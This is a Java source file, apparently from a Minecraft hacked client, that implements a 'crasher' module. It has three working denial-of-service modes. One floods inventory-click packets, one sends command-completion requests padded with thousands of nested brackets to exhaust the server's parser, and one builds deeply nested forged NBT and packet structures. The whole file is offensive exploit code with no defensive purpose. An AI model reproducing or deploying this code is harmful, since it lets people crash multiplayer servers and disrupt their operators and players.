package org.phobos.event;

import io.netty.buffer.Unpooled;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMaps;
import java.io.DataOutput;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.network.ClientPlayerInteractionManager;
import net.minecraft.client.world.ClientWorld;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtElement;
import net.minecraft.nbt.NbtType;
import net.minecraft.nbt.scanner.NbtScanner;
import net.minecraft.nbt.scanner.NbtScanner.Result;
import net.minecraft.nbt.visitor.NbtElementVisitor;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.RegistryByteBuf;
import net.minecraft.network.listener.ServerPlayPacketListener;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.PacketType;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.screen.PlayerScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import org.phobos.core.net.PacketTypeUtils;
import org.phobos.module.misc.CrasherModule;
import org.phobos.module.misc.CrasherModule;

public final class CrasherTickListener extends ModuleListener.Safe<CrasherModule, TickEvent2> {
   public final String[] textArray = new String[]{
      "msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"
   };

   public Packet<ServerPlayPacketListener> resolvePacket(ClientPlayerEntity clientPlayerEntity, Packet<ServerPlayPacketListener> packet) {
      final NbtCompound nbtCompound = new NbtCompound();

      try {
         Field field = nbtCompound.getClass().getDeclaredField("entries");
         field.setAccessible(true);
         field.set(nbtCompound, new LinkedHashMap());
      } catch (Throwable var5) {
      }

      nbtCompound.put("\u0000", new NbtElement() {
         public void write(DataOutput output) throws IOException {
            output.writeInt(2147483645);
            if (packet != null) {
               CrasherTickListener.DelegatePacket delegatePacket = new CrasherTickListener.DelegatePacket(packet);
               PacketByteBuf packetByteBuf = new PacketByteBuf(Unpooled.buffer());

               try {
                  delegatePacket.handlePacketByteBuf(packetByteBuf);

                  int i;
                  for (i = PacketTypeUtils.computePacketType(delegatePacket.getPacketId()); (i & -128) != 0; i >>>= 7) {
                     output.writeByte(i & 127 | 128);
                  }

                  output.writeByte(i);
                  byte[] bytes = new byte[packetByteBuf.readableBytes() - 1];
                  packetByteBuf.readBytes(bytes);
                  output.write(bytes);
               } catch (Throwable throwable) {
                  throwable.printStackTrace();
               } finally {
                  packetByteBuf.release();
               }
            }
         }

         public Result doAccept(NbtScanner visitor) {
            return null;
         }

         public NbtElement copy() {
            return null;
         }

         public NbtType<?> getNbtType() {
            return null;
         }

         public int getSizeInBytes() {
            return 0;
         }

         public void accept(NbtElementVisitor visitor) {
         }

         public byte getType() {
            return 0;
         }
      });
      ClickSlotC2SPacket clickSlotC2SPacket = new ClickSlotC2SPacket(
         clientPlayerEntity.currentScreenHandler.syncId,
         clientPlayerEntity.currentScreenHandler.getRevision(),
         0,
         PlayerScreenHandler.packQuickCraftData(0, 3),
         SlotActionType.QUICK_CRAFT,
         ItemStack.EMPTY,
         Int2ObjectMaps.emptyMap()
      ) {
         public void method_55971(RegistryByteBuf registryByteBuf) {
            RegistryByteBuf registryByteBuf2 = new RegistryByteBuf(Unpooled.buffer(), clientPlayerEntity.networkHandler.getRegistryManager());

            try {
               super.write(registryByteBuf2);
               registryByteBuf.writeByte(registryByteBuf2.readByte());
               registryByteBuf.writeShort(registryByteBuf2.readShort());
               registryByteBuf.writeByte(registryByteBuf2.readByte());
               registryByteBuf.writeShort(registryByteBuf2.readShort());
               registryByteBuf.writeEnumConstant(registryByteBuf2.readEnumConstant(SlotActionType.class));
            } finally {
               registryByteBuf2.release();
            }

            registryByteBuf.writeShort(Item.getRawId(Items.AIR));
            registryByteBuf.writeByte(0);
            registryByteBuf.writeShort(0);
            PacketByteBuf packetByteBuf = new PacketByteBuf(Unpooled.buffer());

            try {
               packetByteBuf.writeNbt(nbtCompound);
               byte[] bytes = new byte[packetByteBuf.readableBytes()];
               packetByteBuf.readBytes(bytes);
               registryByteBuf.writeBytes(bytes);
            } finally {
               packetByteBuf.release();
            }
         }
      };
      return clickSlotC2SPacket;
   }

   public CrasherTickListener(CrasherModule crasherModule) {
      super(crasherModule, TickEvent2.class);
   }

   public void handleObject(
      TickEvent2 tickEvent2, ClientPlayerEntity clientPlayerEntity, ClientWorld clientWorld, ClientPlayerInteractionManager clientPlayerInteractionManager
   ) {
      if (this.module.normal.testNumber(this.module.delay.getValue())) {
         switch ((CrasherModule.Mode)this.module.mode.getValue()) {
            case Window:
               ClickSlotC2SPacket clickSlotC2SPacket = new ClickSlotC2SPacket(
                  clientPlayerEntity.currentScreenHandler.syncId,
                  clientPlayerEntity.currentScreenHandler.getRevision(),
                  36,
                  -1,
                  SlotActionType.SWAP,
                  clientPlayerEntity.currentScreenHandler.getCursorStack().copy(),
                  Int2ObjectMaps.singleton(0, new ItemStack(Items.GOLDEN_CARROT, 1))
               );

               for (int i = 0; i < this.module.packets.getValue(); i++) {
                  clientPlayerEntity.networkHandler.sendPacket(clickSlotC2SPacket);
               }
               break;
            case Completion:
               if (this.module.intValue == this.textArray.length - 1) {
                  this.module.intValue = 0;
               }

               String text = this.textArray[this.module.intValue] + " @a[nbt={PAYLOAD}]";
               int i3 = 2044 - text.length();
               String text2 = this.describeInt(i3);
               String text3 = text.replace("{PAYLOAD}", text2);
               RequestCommandCompletionsC2SPacket requestCommandCompletionsC2SPacket = new RequestCommandCompletionsC2SPacket(0, text3);

               for (int i2 = 0; i2 < this.module.packets.getValue(); i2++) {
                  clientPlayerEntity.networkHandler.sendPacket(requestCommandCompletionsC2SPacket);
               }

               this.module.intValue++;
               break;
            case Payload:
               for (int i5 = 0; i5 < this.module.packets.getValue(); i5++) {
                  Packet<ServerPlayPacketListener> packet = PacketTypeUtils.createChatMessageC2SPacket(clientPlayerEntity, "");

                  for (int i4 = 0; i4 < 1024; i4++) {
                     packet = this.resolvePacket(clientPlayerEntity, packet);
                  }

                  clientPlayerEntity.networkHandler.sendPacket(packet);
               }
         }
      }
   }

   public String describeInt(int i) {
      String text = IntStream.range(0, i).mapToObj(ix -> "[").collect(Collectors.joining());
      return "{a:%s}".formatted(text);
   }

   private static class DelegatePacket implements Packet<ServerPlayPacketListener> {
      public final Packet<ServerPlayPacketListener> serverPlayPacketListenerPacket;

      public PacketType<? extends Packet<ServerPlayPacketListener>> getPacketId() {
         return null;
      }

      public void handlePacketByteBuf(PacketByteBuf packetByteBuf) {
         try {
            if (this.serverPlayPacketListenerPacket instanceof CrasherTickListener.DelegatePacket delegatePacket) {
               delegatePacket.handlePacketByteBuf(packetByteBuf);
               return;
            }

            Method method = this.serverPlayPacketListenerPacket.getClass().getDeclaredMethod("write", PacketByteBuf.class);
            method.invoke(this.serverPlayPacketListenerPacket, packetByteBuf);
         } catch (Throwable throwable) {
            throwable.printStackTrace();
         }
      }

      public void apply(ServerPlayPacketListener serverPlayPacketListener) {
      }

      public DelegatePacket(Packet<ServerPlayPacketListener> packet) {
         this.serverPlayPacketListenerPacket = packet;
      }
   }
}
